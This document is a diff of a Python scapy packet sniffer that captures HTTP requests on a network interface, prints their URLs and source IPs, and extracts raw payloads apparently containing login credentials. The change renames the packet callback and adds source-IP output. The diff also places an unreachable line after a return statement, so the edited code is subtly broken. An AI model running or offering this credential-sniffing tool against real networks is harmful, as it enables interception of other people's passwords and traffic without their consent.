@@ -45,14 +45,12 @@ def get_arguments():
 
 options = get_arguments()
 
-print("\033[1;32m[+]Sniffing with: \033[0m "+ options.interface)
-
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    scapy.sniff(iface=interface, store=False, prn=sniffing_packets)
 
 def sniff_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-
+    src = packet[scapy.IP].src
 def sniff_credentials(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
@@ -62,10 +60,11 @@ def sniff_credentials(packet):
                 return load
 
 
-def process_sniffed_packet(packet):
+def sniffing_packets(packet):
     if packet.haslayer(http.HTTPRequest):
         url = sniff_url(packet)
-        print("\033[1;36m[*]URL:\033[1;37m" + url)
+        src = packet[scapy.IP].src
+        print("\033[1;36m[*]" "URL:\033[1;37m" + url + "\t" + "\033[1;32m "+ src + "\033[0m")
 
         credentials = sniff_credentials(packet)
         if credentials:
